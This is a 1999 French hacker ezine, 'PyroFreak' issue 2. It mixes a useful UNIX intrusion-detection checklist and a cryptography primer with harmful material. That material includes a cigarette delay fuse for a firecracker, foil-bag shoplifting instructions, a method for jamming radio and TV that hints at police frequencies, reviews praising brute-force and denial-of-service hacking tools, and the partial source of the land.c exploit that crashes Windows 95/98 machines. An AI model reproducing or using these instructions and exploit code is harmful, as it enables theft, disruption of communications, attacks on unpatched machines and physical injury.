---
title: "pyrofreak-2"
ezine: "pyrofreak"
---

# pyrofreak-2

**Ezine:** pyrofreak

<div className="ascii-content">

```

         -::-Allons y pour la libertΘ d'expression!!!
            _____ _____     _     ______  ______ __ ___      _________
           |:      __ _ \  \  \  /     / |        ____ |    /   ___   |
           |      \__ _\ \  \  \/ ;   /  |;      /_ _/ |   /   /   /; |
           |   ____ __ ___\  \    :  /   |:  _        /   |   /   / : | 
           |: |              /    , /    |, | \     : \   |  :\__/    |
           |; |          ___/ .    /     |. |  \    ;  \  |  ;       /
           |___\         \________/      |___\  \__ ____\ |_________/
            ____ _ ___ __     ___   ___          ______   __    _______
           |:  _ _      ;\   |   \ \   \        /     ;| |  |  /   .  /
           |  |   \_______\  |:  _\ \_ _\      / /|   :| | ;| /      /
          _|  |___   _____   |; |__  ____     / <_|   ,| |  |/    : /
         |_|,  ___| |;   .\  |   __\ \_:__\  /   _     | |        ;/
           |: |     |:  ` /  | :|____  ____  \  / |;   | |  |\     \
           |; |     |, |\ \  | ;     \ \   ;\ \/  |:   | |: | \    .\
           |___\    |__| \_| |________\ \____\    |____| |___\ \_____\
             
                                                   CrΘdit: __2
26 FΘvrier 1999

	Vous devez lire ceci avant d'aller plus loin

Pyrofreakmag (et ses membres) tient a avertir les gens qui vont continuer
a lire le texte qui va suivre: Ont n'est aucunement responsable 
des actes, et meme des pensΘs qui pourraient etre produites par les lecteurs
de ce zine par rapport a nos articles . Nous tenons a mettre cela bien au 
clair. Si vous n'etes pas d'Accord avec cet affirmation, fermer ce texte, 
et effacer le de votre disque dur ou sur tout autres disques. Vous etes
le seul responsable de vos actes.


Comment nous rejoindre?:

Voici les moyens de rejoindre Pyrofreakmag et ses membres.

Soit sur IRC, sur #phreak.fr ,via le serveur undernet.
Soit par e-mail:  

            pyrofreakmag@hotmail.com  | Pour tous les membres            
		neuro@frphreak.com        | Pour rejoindre Neuro
		lordendrix@hotmail.com    | Pour rejoindre Endrix
		darkm0nk@rocketmail.com   | Pour rejoindre [G]r4FX
		NuClEaR@nuc99.com         | Pour rejoindre Nuclear
            fuckyou@ass.hole          | Pour le service des plaintes

Et vener visiter notre site web: http://pyrofreak.cjb.net
ou http://bill.gates.suck.trop.des.fallus.a.mon.gout.usuck.com

Si vous voulez que votre article apparaisse dans le #3, envoyer le a
pyrofreakmag@hotmail.com . Ou si vous avez des questions, des commantaires, 
des suggestions, envoyer les aussi a pyrofreakmag@hotmail.com . SVP, 
pas de question style: Comment hacker ou Comment phreaker?


 ____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                           TABLE DES MATIERES                                              
'.________  __ __ ___________ ____ ______________ ____ ___ ______ __ __

       TITRE DE L'ARTICLE                        NICK DE L'AUTEUR

      Intro                                            Neuro
      Vous vous etes fait hackΘ ?                      [G]r4FX
      Vol a l'Θtalage                                  Endrix   
      Brouillage de FrΘquences                         Neuro
      Crytographie                                     [G]r4FX
      Critiques de Programmes                          Endrix
      Finger                                           [G]r4FX
      Encore les VMBs                                  Neuro
      Linux vs Windows                                 Endrix
      Conclusion                                       Neuro

____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                                  Intro                     
'.________  __ __ ___________ ____ ______________ ____Par Neuro__ __

Ce numero a ΘtΘ dur a terminer, pourquoi? C'est simple, on manque 
d'implication de la part de nos lecteurs. Ils nous faut des nouvelles idΘes,
de nouveaux concepts, pour aider α nous amiliorer, et cela vous pouvez nous
aider grandement. Comment? En nous donnant vos idΘes, vos articles, des 
commentaires, des critiques, des questions, et cela par les moyens annoncer
plus haut: (e-mail, #phreak.fr , ...). J'espere que pour le numero 3 on va
avoir beaucoup plus d'implication de votre part.

En passant, on essait de faire notre possible pour Θliminer le plus possible
les fautes d'orthographes, mais plusieurs s'y glissent pareil, alors SVP, vener
pas nous les faire remarquer. En vΘriter, moi je m'en colisse pas mal des fautes,
c'est le contenu qui compte d'apres moi, chacun son opinion.

J'aimerais revenir sur un de mes trucs dans le #1, parce que j'ai ΘtΘ
capable de retrouver des informations intΘressantes sur celui-ci.

C'Θtais le truc qu'on peu se servir d'une cigarette comme mΦche, voici un 
beau graphique:


                            |=|
                            |=| ---------- filtre
                            |=|
                            | |
                            | |
                            |o| ---------- Trou pour la meche
 cigarette ------------     | |        (Exemple Petard α meche M-80)
                            | |
                            | |
                            | |
                            | |
                            | |
                            | |
                            | |
                            | |
                            |_| ---------- Allumer ici :))

Une cigarette sans avoir ΘtΘ "poffer" dur en moyenne 8 min, planifier votre
"plan" par rapport a cela!


Vous etes seul responsable de vos actes!!

____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                    Vous vous etes fait hackΘ ?
'.________  __ __ ___________ ____ ______________ ____Par [G]r4FX__ __


Intro:  
Depuis le tous premier dΘbut du protocol tcp/ip et tout ce qui concerne 
l'I-net, une nouvelle race de "warrior" est apparut sur notre planΦte... 
P-e d'origine humaine ou extra-terrestre... Mais ils savent faire les choses.  
Ils n'ont aucune bombes, aucuns fusils, aucune ΘpΘes... Leurs seule arme est 
leur connaissances... Voici un petit texte qui dΘmontre brievΦment comment 
savoir si on n'a ΘtΘ victime de leur cyber-crime....


A. Rechercher des signes que votre systΦme peut avoir ΘtΘ attaquΘ avec
succΦs 

Examinez les fichiers "log" α la recherche des connexions de provenance inhabituelle ou des
activitΘs non usuelles.

Par exemple, surveillez votre "last log", les processus de comptabilitΘ systΦme, tous les "logs" 
gΘnΘrΘs par syslog, et d'autres "logs" de sΘcuritΘ. Si votre garde-barriΦre ou routeur envoit 
des "logs" dans un endroit autre que le  systΦme victime de l'attaque, n'oubliez pas de vΘrifier
Θgalement ces "logs". Notez que ceci n'est pas fiable α toute Θpreuve car, α moins que l'enregistrement 
des "logs" ne soit permit qu'α la fin du fichier de stockage, beaucoup d'intrus Θditent les fichiers de 
"logs" afin de cacher leur activitΘ. 

Cherchez partout sur votre systΦme des fichiers ayant un "setuid" ou "setgid" (surtout "setuid
root").

Les intrus laissent souvent des copies de /bin/sh ou /bin/time avec "setuid" afin d'avoir un 
accΦs "root" ultΘrieurement. La commande UNIX find (1) peut Ωtre utilisΘe pour rechercher des 
fichiers "setuid" ou "setgid". Par exemple, vous pouvez utiliser les commandes suivantes pour 
trouver des fichiers "setuid root" et "setgid kmem" sur tout le systΦme de fichier: 

     	find / -user root -perm -4000 -print 

	find / -group kmem -perm -2000 -print 

Il est α noter que les exemples prΘcΘdents recherchent sur toute l'arborescence de rΘpertoire, y 
compris les systΦmes de fichiers NFS/AFS montΘs. Certaines commandes find (1) supportent l'option "-xdev" 
pour Θviter la recherche sur ces rΘpertoires. Par exemple: 

	find / -user root -perm -4000 -print -xdev 

Une autre faτon de chercher les fichiers "setuid" est d'utiliser la commande ncheck (8) sur chaque 
partition de disque. Par exemple, utilisez la commande suivante pour rechercher les fichiers "setuid" 
et les fichiers spΘciaux sur la partition /dev/rsd0g: 

	ncheck -s /dev/rsd0g 

Testez les binaires de votre systΦme afin d'Ωtre s√r qu'ils n'ont pas ΘtΘ modifiΘs.

Il s'est produit par le passΘ que des pirates ont rΘussi α modifier les programmes du 
systΦme UNIX tels que login, su, telnet, netstat, ifconfig, ls, find, du, df, libc, 
sync, n'importe quels binaires rΘfΘrencΘs dans /etc/inetd.conf, et autres programmes 
critiques rΘseau et systΦme ou tout autres sous-programmes des librairies partageables 
de systΦme. Comparez les versions sur votre systΦme avec de bonnes copies telles que 
celles fournies sur les mΘdias d'initialisation. Soyez circonspect vis α vis de vos 
copies de sauvegarde (backup); elles peuvent elles aussi contenir des chevaux de Troie. 

Les programmes des chevaux de Troie peuvent produire les mΩmes "checksum" standard et 
date que la version lΘgitime. C'est pourquoi la commande UNIX standard sum (1) et 
les dates associΘs aux programmes ne sont pas suffisants pour dΘterminer si les 
programmes ont ΘtΘ remplacΘs. L'utilisation de cmp (1), MD5, Tripwire, et autres 
outils "checksum" cryptographiques est tout dΘsignΘe pour dΘtecter ces programmes 
de cheval de Troie, α condition que ces outils "checksum" eux-mΩmes sont gardΘs dans 
un lieu s√r et ne sont pas modifiables par les intrus. En plus, vous pouvez peut-Ωtre 
envisager d'utiliser un outil (PGP, par exemple) afin de signer la sortie gΘnΘrΘe par 
MD5 ou Tripwire pour une rΘfΘrence future. 

VΘrifiez vos systΦmes, pour ce qui concerne l'utilisation non autorisΘe d'un programme de
monitorisation rΘseau, communΘment appelΘ le sniffeur ou sniffeur de paquet.

Les pirates peuvent utiliser un sniffeur pour capter les compte et mot de passe d'utilisateur. 
Pour information sur le sujet, voir l'avis CA-94:01 du
CERT disponible α: 

ftp://info.cert.org/pub/cert_advisories/CA-94:01.network.monitoring.attacks 



Examinez tous les fichiers lancΘs par cron et at.

Les pirates peuvent laisser des portes dΘrobΘes (back doors) dans les fichiers lancΘs par cron ou
soumis α at. Ces techniques peuvent permettre le retour des intrus sur le systΦme (mΩme aprΦs que 
vous pensez que vous aviez rΘussi α redresser votre systΦme). VΘrifiez bien aussi que tous les fichiers 
et programmes rΘfΘrencΘs (directement ou indirectement) par les "jobs cron  et at", et les fichiers 
"job" eux-mΩmes ne sont pas accessibles en Θcriture pour tout le monde. 



VΘrifiez les services non autorisΘs. 

Examinez les additions ou modifications non autorisΘes dans le fichier /etc/inetd.conf. 
En particulier, recherchez les entrΘes qui exΘcutent un programme "shell" (par exemple, 
/bin/shell ou /bin/csh) et testez tous les programmes qui sont spΘcifiΘs dans 
/etc/inetd.conf pour vΘrifier qu'ils sont corrects et n'ont pas ΘtΘ remplacΘs par des 
programmes cheval de Troie. 

VΘrifiez Θgalement les services lΘgitimes que vous avez dΘsactivΘs dans /etc/inetd.conf. 
Les pirates peuvent rΘactiver un service que vous croyez avoir dΘsactivΘ, ou remplacer 
le programme "inetd.conf" par un programme cheval de Troie. 

Examinez le fichier /etc/passwd sur le systΦme et vΘrifiez les modifications apportΘes 
au fichier.

En particulier, recherchez les crΘations de nouveaux comptes non autorisΘes, les comptes sans 
mot de passe, ou les changements d'UID (surtout UID 0) sur les comptes existants. 

VΘrifiez les entrΘes non autorisΘes dans vos fichiers de configuration systΦme et rΘseau.

En particulier, recherchez le signe '+' et les noms de machines extΘrieures dans /etc/hosts.equiv, 
/etc/hosts.lpd, et dans tous les fichiers .rhosts (spΘcialement root, uucp, ftp, et autre compte systΦme)
sur le systΦme. Ces fichiers doivent Ωtre protΘgΘs en Θcriture pour tout le monde. De plus, 
assurez-vous que ces fichiers existaient avant toute intrusion et n'ont pas ΘtΘ crΘΘs par un intrus. 

Cherchez partout dans votre systΦme des fichiers inhabituels ou cachΘs

Ces fichiers dont le nom commence par un point et ne sont normalement pas affichΘs par la commande 
ls, peuvent servir α cacher des outils et information (programmes de craquage des mots de passe, 
fichiers de mots de passe en provenance d'autres systΦmes, etc.). Une technique commune sur les 
systΦmes UNIX est de placer un rΘpertoire cachΘ dans un compte utilisateur avec un nom inhabituel, 
quelque chose comme '...' ou '.. ' (2points espace) ou '..^G' (2points control-G). Encore, une fois de plus, 
la commande find (1) peut Ωtre utilisΘe pour rechercher les fichiers cachΘs, par exemple: 

	find / -name ".. " -print -xdev 

	find / -name ".*" -print -xdev | cat -v 

Des fichiers avec '.xx' ou '.mail' comme nom ont ΘtΘ Θgalement utilisΘs (c'est α dire des fichiers 
qui ressemblent α des fichiers normaux). 

Examinez toutes les machines sur le rΘseau local lorsque vous recherchez des signes d'une
intrusion 

La plupart du temps, si une machine a ΘtΘ piratΘe, les autres sur le rΘseau l'ont ΘtΘ aussi. 
Ceci est spΘcialement vrai dans le cas des rΘseaux o∙ tourne NIS et o∙ les machines font mutuellement 
confiance, les uns aux autres, α travers l'usage des fichiers .rhosts ou /etc/hosts.equiv. VΘrifiez 
donc toutes les machines avec lesquelles vos utilisateurs partagent des accΦs via .rhosts. 

__ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                            Vol a l'Θtalage
'.________  __ __ ___________ ____ ______________ ____Par Endrix__ __


 Dans ce petit texte, je vais vous expliquer comment ressortir avec un CD, 
un film ou mΩme n'importe quoi qui a un petit collant magnΘtique dessus 
sans faire sonner l'alarme.

 C'est trΦs simple parce que tout ce que le collant magnΘrique fait, c'est
qu'il retourne le signal aux machins trucks qu'il y a α la sortie de presque
toute les boutiques aujoud'hui. Moi je connais une maniΦre de broyΘ ce systΦme
pour que rien sonne. Je vous rapelle que c'est pour votre connaissance 
personnelle et non pour le pratiquer. 

 Tout ce qu'il faut : - 2 Sac en plastique pareille
                      - Papier d'allunimium

 Bon... Dans un sac, placer de papier d'alluminium partout α l'intΘrieur 
de maniΦre que quand vos choses vont tombΘ dans le sac, les objets vont Ωtre
protΘgΘs contre les rayons. AprΦs, entrer le 2Φme sac α l'intΘrieur de celui-ci
pour que personne puisse voir le papier d'alluminium.

 Maintenant, vous Ωtes pret pour aller tout tester. Je vous conseille pour votre
premiΦre fois, d'aller dans une place "B.S." juste au cas ou il arrive quelque chose.
Mais si vous avez bien fait le travail, vous ne devriez pas avoir de problΦme.

- G00d fuck :)
__ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                      Brouillage de FrΘquences                  
'.________  __ __ ___________ ____ ______________ ____Par Neuro__ __
Il y a quelque temps, j'Θtais sur le point de terminer un emmeteur-rΘcepteur
am portatif, (cb). Jusque la tout, etais normal. Mais quand j'eu fini mon 
montage et que je testa mon emmeteur-rΘcepteur, quelque chose de spΘcial si
produisi. Vous vous en douter, j'embarquais sur toute les frΘquences quand 
j'emmetais, pas seulement sur le am, mais aussi la tΘtΘvision.(J'Ai pas tester
sur le FM).

Qu'est ce que ca faisais, c'est simple, tout Θquipement qui utilise les 
frΘquences m'entioner plus haut. et qui se trouvais a moins de 500 m de
rayon avec l'emmeteur-rΘcepteur Θtais tout simplement brouiller. C'Θtais un
brouillage intermΘdiaire, ce que je veux dire par ce terme, c'est qu'on
pouvais comprendre quelques mots d'une conversation sur les frΘquences AM,
mais cela tres difficilement. C'Θtais identique pour la tΘlΘvision, sauf avec
une moins grande influence. PLusieurs lignes brouillais l'Θcran, mais image
Θtais encore assez clair. (ici je parle bien entendu d'une rΘception avec
antenne et non cable, Satellite cΘ a voir). Je me suis pencher sur le
phΘnomene, et voila ce que j'ai rΘussi a comprendre de ceci.

Mon emmeteur-rΘcepteur au dΘpart Θtais Θquiper pour voyager (frΘquences) a
1.5 km de rayon. Ce qui veut dire que la porter de la frΘquence avais
diminuer de facon considΘrable, soit 1km. tout a coup, je me souvenu
de quelques choses qui s'Θtais produit en faisant mon montage. J'avais eu de
la difficulter a souder la frΘquence variable. J'ai resouder ma frΘquence, et 
maintenant tout fonctionnais bien, plus de brouillage d'onde. Ce qui veut
dire que le brouillage Θtais causer par ma frΘquence qui Θtais mal installer.
Ce que je veux dire par mal installer, c'est que les broches avais un contact
(Θtain) entre eux. CΘ aussi simple que ca.

Comment rΘaliser cela plus facilement? Avec un Walkie Talkie (cb pour enfants),
Vous avez juste a relier les 2 broches de la frΘquence (standart) avec une
goute d'Θtain. Comment distinguer la frΘquence? CΘ assez simple, 90% du temps
elle est grisse ou bleu, et rectangle de face, et ovale du dessus. Je sais pas
si vous me suivez, tk. Aller lire un livre d'Θlectro pour plus de renseignements.

Je garanti pas a 100% que cet technique fonctionne bien, mais d'apres mon 
expΘrience, ya beaucoup de chance. En passant si cela fonctionne pour le fm,
bein, la police communique par le FM, vous me voyer venir. En passant vous 
pouvez avoir une plus grande porter avec un plus puissant emmeteur (cΘ 
Θvident). A vous de trouver des utilitΘs a ce projet, qui d'apres moi son 
assez nombreuses, surtout si vous etre un commerτant qui vend le cable TV,
hΘhΘ. J'me comprend.


____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                            Crytographie                     
'.________  __ __ ___________ ____ ______________ ____Par [G]r4FX__ __

Introduction:

Ce texte a ΘtΘ Θcrit, pour qui la crytographie est une difficultΘ dans leurs
taches.  Si vous voulez que vos attaques de Hack ou Crack soit fonctionnelles, 
il va surement falloir un jour que vous faites de l'encryptage/dΘcryptage. Ce
texte vous montre une bonne partie de ce que vous devez savoir sur la 
cryptographie.


La cryptographie :

L'Internet n'est pas sΘcuritaire! Cette affirmation, plusieurs fois rΘpΘtΘe,
risque de crΘer une vΘritable parano∩a, et rend des gens rΘticents α utiliser
l'Internet comme moyen de communication. Il existe pourtant une technologie
de pointe qui peut apporter des solutions pour permettre de rΘaliser des 
transactions en toute sΘcuritΘ sur l'Internet. Elle s'appelle la cryptographie.
 

Une transaction, qu'il s'agisse d'un traitement bancaire ou d'un Θchange de 
courrier Θlectronique est dite sΘcuritaire si elle satisfait aux quatre
conditions suivantes: 

 1.AuthenticitΘ des intervenants. Lorsqu'on effectue une transaction, on veut
bien pouvoir s'assurer de l'authenticitΘ de son correspondant. Or, α l'heure
actuelle, le courrier Θlectronique, la technologie W3 (World Wide Web) 
le permettent, mais c'est pas super fonctionnelle. Dans le cas du courrier
Θlectronique, il est trΦs facile pour quiconque de modifier l'en-tΩte d'un
courrier Θlectronique qui contient l'adresse de l'expΘditeur pour se faire
passer pour un autre. Dans le cas du W3, la mascarade de numΘro IP (IP 
spoofing) pour cacher l'identitΘ de la connexion provenance source est plus
difficile, mais l'entreprise n'est nullement insurmontable. 
   
 2.ConfidentialitΘ de la transaction. Le fondement de la communication en
rΘseau de l'Internet repose essentiellement sur la suite de protocoles TCP/IP
(Transmission Control Protocol/Internet Protocol). Donc, il est trΦs impor-
tant que TCP/IP soit sΘcuritaire, la version IPv6 plus robuste et plus sΘcu-
ritaire est maintenant utiliser par l'IETF (Internet Engineering Task Force). Toute
L'information qui transite de passerelle en passerelle sur l'Internet
circule en clair. Quiconque fait de l'Θcoute de rΘseau peut intercepter
les paquets de donnΘes et accΦde α l'information dΘsirΘe. 
   
 3.IntΘgritΘ du message. Rien n'assure que le message est intact pendant son
transfert sur le rΘseau. Il pourrait bien Ωtre interceptΘ et modifiΘ par 
n'importe qui sans que son propriΘtaire s'en rend compte. 
   
 4.Non-rΘpudiation du message. Ca, ca veut dire la possibilitΘ pour quelqu'un
de renier qu'il est l'auteur du message. Donc l'authentification vient d'Ωtres
corrompu.

Ces quatre conditions de sΘcuritΘ posent de grands dΘfis α l'Internet qui ,
pour les relever, n'a pas d'autre choix que de faire appel α des techniques
d'encryptage sophistiquΘes que seule la technologie la plus avancΘe de la
cryptographie puisse en procurer. On distingue deux grands types de
mΘthocryptographiques: 

 1.MΘthode α clef secrΦte ou symΘtrique, dans laquelle l'algorithme utilisΘ
est connu de tout le monde, mais la clef utilisΘe reste secrΦte aux parties
et qui sert α la fois au cryptage et au dΘcryptage. Les algorithmes les plus
connus qui sont classΘes comme pioniΦressont DES (Digital Encryption
Standard), Triple-DES, IDEA (International Data Encryption Algorithm), RC2,
RC4, RC5 (Rivest's Code #2, #4 #5), Skipjack etc. Si Alice veut envoyer un 
message α Robert, elle doit convenir avec ce dernier d'un algorithme et d'une
clef. La clef doit Ωtre ΘchangΘe de maniΦre sΘcuritaire. 
   
 2.MΘthode α clef publique ou asymΘtrique, dans laquelle l'algorithme est
Θgalement connu des parties, mais chaque partie possΦde non pas une clef
mais une paire de clefs: une clef publique connue de tout le monde et une
clef privΘe personnelle, gardΘe secrΦte. Les algorihmes les plus connus et
ceux qui qui sont classΘes comme pioniΦres sont RSA (Rivest-Shamir-Adleman),
Diffie-Hellman, Merkle-Hellman, etc. Si Alice dΘsire communiquer avec Robert,
elle doit convenir avec celui-ci d'un algorithme et lui demande sa clef
publique. Elle crypte son message avec la clef publique de Robert avant de
l'envoyer. └ la rΘception, Robert dΘcrypte le message α l'aide de sa propre
clef privΘe. 

La mΘthode α clef secrΦte est rapide en terme de vitesse de cryptage/dΘcryp-
tage, elle exige par contre un canal sΘcurisΘ pour la transmission des
clefs. La mΘthode α clef publique est lente, cent fois moins rapide que la
mΘthode α clef secrΦte, mais elle est plus robuste et dispose des
dispositifs trΦs sΘcuritaires pour la distribution des clefs publiques
(serveurs, annuaires publics, centres de certification). Dans la pratique,
on utilise conjointement les deux mΘthodes. Il y a alors deux cryptages.
Lorsqu'Alice veut envoyer un message α Robert: 

     elle demande α Robert de lui fournir sa clef publique; 
     elle gΘnΦre une clef alΘatoire, appelΘe la clef de session; 
     elle crypte le message avec un algorithme symΘtrique (du type DES, par
          exemple) α l'aide de la clef de session; 
     elle crypte ensuite la clef de session avec un algorithme asymΘtrique
          (du type RSA, par exemple) en utilisant la clef publique de Robert; 
     elle envoie α Robert le tout, la clef de session et le message, tous les
          deux cryptΘs. 

Robert reτoit l'ensemble de clef de session et de message cryptΘs: 

     il utilise sa clef privΘe pour dΘcrypter d'abord la clef de session; 
     il utilise par la suite la clef de session obtenue pour dΘcrypter et
        obtenir finalement le message. 

Le "cryptage avec clef publique/dΘcryptage avec clef privΘe" assure la
confidentialitΘ de la transaction. Mais les trois autres critΦres peuvent-ils
Ωtre satisfaits? La rΘponse est oui, α condition qu'on ajoute des Θtapes α la
mΘthode utilisΘe. En fait, l'intΘgritΘ et la non-rΘpudiation sont rΘsolues α
l'aide de ce qu'on appelle la signature digitale (ou la signature numΘrique).
Contrairement au cas d'encryptage o∙ la clef publique sert au cryptage et la
clef privΘe, au dΘcryptage; dans la signature digitale c'est inverse: la clef
privΘe est utilisΘe pour le cryptage et la clef publique, pour le dΘcryptage.
Le principe est le suivant: 

Lorsqu'Alice envoie son message α Robert, elle envoie Θgalement une signature
digitale: 

     elle utilise d'abord un algorithme spΘcial, appelΘ "hash algorithm", qui
          transforme son message de longueur quelconque en une chaεne de 
          longueur constante (un nombre de 128-bit de long). C'est ce qu'on
          appelle un "message digest". Les algorithmes les plus connus
          sont SHA (Secure Hash Algorithm), Snerfu, MD4, MD5 (Message Digest
           #4, #5), etc. L'algorithme ne fonctionne que dans une direction
          et particuliΦrement robuste α l'inversion: il est quasi impossible
          de retrouver le message original α partir du "message digest". 
     elle crypte ensuite le "message digest" avec sa propre clef privΘe et le
     transmet α Robert. 

└ la rΘception: 

     Robert utilise la clef publique d'Alice pour dΘcrypter le "message 
digest" pour avoir et le message et le "digest"; il calcule Θgalement 
le "digest" du message reτu. 

Si les deux "digest" sont identiques, Robert peut Ωtre certain: 

     que le message n'a pas ΘtΘ altΘrΘ (intΘgritΘ); 
     qu'Alice ne pourra pas rΘpudier le message, Θtant donnΘ qu'elle seule
connaεt sa clef privΘe (non-rΘpudiation). 

Il reste l'authenticitΘ. Lorsqu'Alice demande α Robert de lui fournir sa clef
publique, qu'est-ce qui lui prouve que ce n'est pas quelqu'un d'autre
qui lui rΘpond? Rien, si Robert n'a pas fait auparavant enregistrer sa clef
publique auprΦs d'une "autoritΘ de certification". La dΘmarche est
simple: 

     Robert calcule sa clef publique et sa clef privΘe α l'aide d'un logiciel
utilitaire (Netscape, Oracle, Pretty Good Privacy, etc.); il envoie α un 
organisme de certification (VeriSign, par exemple) sa clef publique avec
d'autres informations personnelles prouvant son identitΘ; 

     L'organisme de certification, aprΦs vΘrification auprΦs d'une tierce 
partie pour s'assurer de l'identitΘ de Robert, Θmet un certificat qui 
comporte, en autres, l'identitΘ de Robert, sa clef publique, la date 
d'Θmission, etc. Le certificat est signΘ digitalement par l'autoritΘ 
de certification. 
    
      Alice, lorsqu'elle veut s'assurer de l'identitΘ de Robert, elle 
lui demande son certificat qu'elle vΘrifie en utilisant la clef publique de
l'autoritΘ de certification. 

La cryptographie α clef publique est la clef des transactions sΘcuritaires
sur l'Internet. Elle donne naissance α plusieurs applications majeures,
parmi lesquelles se trouvent notamment le SHTTP (Secure HyperText Transfer
Protocol) de l'Enterprise Integration Technologies et le SSL (Secure Socket
Layer) de la Netscape Communications Corporation. 



____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                     Critiques de Programmes
'.________  __ __ ___________ ____ ______________ ____Par Endrix__ __



 Bon, hey bien dans ce texte je vais vous dire quels outils de hacking, 
phreaking... sont les meilleurs et lesquels sont poches. Le seul juge est
moi alors il est possible que je me trompe en disant qu'un tel prog est 
poche quand il est super bon.. C'est mon opinion personnelle alors il
faut en prendre et en laisser. Donc dans chaque ezine il va avoir un 
diagnostique sur quelque bon programme.

______________________________________________________________________
Analyse du programme   : Legion 2.11
Auteur(s)              : rhino9
URL de tΘlΘchargement  : Http://rhino9.ml.org
Note sur 10            : 7/10
Note(s) du programme(s) : Marche pas tout les coups mais la pluspart du
                          temps ca marche
Option(s)               : - Scan pour des IP's en partage de fichier
                          - Brute Force access mΩme si le IP a un password
                          - Permet de Mapper Drive
                          - Peut mapper plusieurs IP en mΩme temps
Fonction(s) du programme : HeY bien ce programme permet de hacker une 
                           personne qui est en partage de fichier et 
                           contient un scanneur inclus.
Commantaire(s) Additionnel(s) : N/A   
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


______________________________________________________________________
Analyse du programme   : Genius 2
Auteur(s)              : Messiah
URL de tΘlΘchargement  : Http://www.sinnerz.com/genius/
Note sur 10            : 10/10
Note(s) du programme(s) : Aucun bug trouvΘ 
Option(s)               : - Internet Clients : - Finger 
    			    	               - FTP
   					       - Internet Browser
 					       - Ping
 					       - SMTP
 				               - Telnet
 					       - Time
 					       - TraceRoute
					       - Whois
                       - Internet tools : - Current Connections
 					  - Download Manager
 					  - Name Scanner
					  - NS lockup
 					  - Patience
				          - Port Info
 					  - Service Scanner
					  - Site Checker
		       - PIM : - Address Book
			       - Note 
 			       - Password
		       - Utilities : - Convertion
				     - Computer Search
				     - Password Generator
				     - UUEncode
                       - Mail Check (avec configuration)
                       - Finger Server (avec configuration)
		       - Ident Server (avec configuration)
                       - PortScan detection (avec configuration)
                       - Port Watcher (avec configuration)
		       - Stay Alive (avec configuration)
		       - HotKeys (avec configuration) 
                       - Help file

Fonction(s) du programme : Alors la, ce programme a plusieur fontions .. Il
                           trΦs pratique pour plein de chose pour vous trouverez
                           vous mΩme avec des choses pratiques !!
Commantaire(s) Additionnel(s) : Excellent programme que tout le monde devrait 
                                avoir !!!!
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


___________________________________________________________________________
Analyse du programme  : Aggressor version 0.99
Auteur(s)             : Aggressor team
URL de tΘlΘchargement : http://aggressor.net
Note sur 10           : 10/10
Note(s) du programme  : Souvent quand tu ouvres le programe, il marque
                        Critical Error the program will be unstable now
                        mais moi ca marche toujours bien aprΦs.
Options(s)            :- Scanner de boite linux et de BSD
                       - Testeur du Buffet Overflow pour le count.cgi
                       - Scanneur du bug dans le CGI de faxsurvey et s'il trouve
                         le bug et dΘmontre comment un hacker peut gagnΘ l'access
                         au r00t avec ca.
                       - Scan la vulnΘrabilitΘ dans les scriptsHTML
                       - Scan la vulnΘrabilitΘ dans les scripts perl
                       - Scan la vulnΘrabilitΘ des script PHP CGI
                       - Scan pour voir si vous avez et comment auter le bug 
                         du /cgi-bin/test-cgi
                       - Scan la vulnΘrabilitΘ de votre WWWBoard
                       - Exploit le CGI Guess
                       - coke (denial)
                       - Scan pour l'exploit du login avec Anonymous
                       - Crash un FTP avec le Buffet Overflow 
                       - Scan les FTP de warez
                       - Scan pour le trojan GirlFriend
                       - Hanson (denial)
                       - ICMP Echo killer
                       - Kill votre Ident
                       - Land (denial)
                       - nestea (denial)
                       - NetBUS detector
                       - BackOrifice Scanner
                       - Peut aussi agir comme un FireWall
                       - Donne tout les rΘsultats dans un beau petit tableau
                         pour que le webmaster puisse tout compredre :)
                       - Et ya plein d'autres choses que j'ai pas encore trouvΘ!!!
Fonction(s) du programme : Sa fonction procipale est de scanner un serveur 
                           pour y trouvΘ des failles que les pirates pourraient
                           exploitΘ afin de gagner le r00t du serveur mais 
                           plusieurs personnes ont fais des librairies addon pour
                           le programme alors la je trouve que c'est plus un 
                           programme de hacking que n'importe quoi d'autre mais
                           il est toujours aussi efficace.... 
Commantaire(s) Additionnel(s) : WAW Super programme mais coute CHER !!(heehe vive le cracking =P)
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


______________________________________________________________________
Analyse du Script      : Land.c
Auteur(s)              : m3lt, FLC
URL de tΘlΘchargement  : Http://www.rootshell.com
Note sur 10            : 8/10
Note(s) du programme(s) : TrΦs efficace pour le monde qui sont pas patchΘ
Option(s)               : - Crash une machine sous Win95, 98
Fonction(s) du programme : - Crash une machine sous Win95, 98
Commantaire(s) Additionnel(s) : N/A   

Voici le code : 
»»»»»»»»»»»»» »
/* land.c by m3lt, FLC
   crashes a win95 box */

#include &lt;stdio.h>
#include &lt;netdb.h>
#include &lt;arpa/inet.h>
#include &lt;netinet/in.h>
#include &lt;sys/types.h>
#include &lt;sys/socket.h>
#include &lt;netinet/ip.h>
#include &lt;netinet/ip_tcp.h>
#include &lt;netinet/protocols.h>

struct pseudohdr
{
        struct in_addr saddr;
        struct in_addr daddr;
        u_char zero;
        u_char protocol;
        u_short length;
        struct tcphdr tcpheader;
};

u_short checksum(u_short * data,u_short length)
{
        register long value;
        u_short i;

        for(i=0;i<(length>>1);i++)
                value+=data[i];

        if((length&1)==1)
                value+=(data[i]<<8);

        value=(value&65535)+(value>>16);

        return(~value);
}

int main(int argc,char * * argv)
{
        struct sockaddr_in sin;
        struct hostent * hoste;
        int sock;
        char buffer[40];
        struct iphdr * ipheader=(struct iphdr *) buffer;
        struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));
        struct pseudohdr pseudoheader;

        fprintf(stderr,"land.c by m3lt, FLC\n");

        if(argc<3)
        {
